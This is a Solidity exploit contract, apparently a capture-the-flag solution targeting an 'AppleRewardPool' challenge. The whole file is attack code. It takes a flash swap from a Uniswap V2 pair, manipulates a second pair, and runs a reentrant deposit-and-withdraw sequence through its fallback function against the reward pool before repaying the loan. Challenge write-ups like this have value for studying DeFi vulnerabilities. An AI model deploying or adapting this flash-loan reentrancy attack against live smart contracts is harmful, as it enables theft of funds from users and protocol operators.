pragma solidity 0.5.16;
import "./UniswapV2Factory.sol";
import "./AppleToken.sol";
import "./AppleRewardPool.sol";
import "./check.sol";
import "hardhat/console.sol";

contract ApplePoolAttackNumen23 {
    ApplePoolCheckNumen23 public applePoolCheck;
    AppleRewardPool public appleRewardPool;
    UniswapV2Pair public pair1;
    UniswapV2Pair public pair2;
    IERCLike public token1;
    IERCLike public token2;
    IERCLike public token3;

    function attack(address target)  public returns(bool) {
        applePoolCheck = ApplePoolCheckNumen23(target);
        appleRewardPool = applePoolCheck.appleRewardPool();
        pair1 = UniswapV2Pair(applePoolCheck.pair1());
        pair2 = UniswapV2Pair(applePoolCheck.pair2());
        token1 = IERCLike(pair1.token1());
        token2 = IERCLike(pair2.token1());
        token3 = appleRewardPool.token3();
        token1.approve(address(appleRewardPool), 100000 ether);
        token2.approve(address(appleRewardPool), 100000 ether);
        pair1.swap(0, 9999 ether, address(this), new bytes(2));
        token2.transfer(address(pair2), 5000 ether);
        pair2.swap(3333 ether, 0, address(this), new bytes(0));

        appleRewardPool.deposit(1, 5000 ether);
        appleRewardPool.withdraw(1, 5000 ether);
        appleRewardPool.deposit(1, 5000 ether);
    }

    function() external {
        appleRewardPool.deposit(0, 1 ether);
        appleRewardPool.withdraw(0, 1 ether);
        token1.transfer(address(pair1), 9999 ether);
    }
}

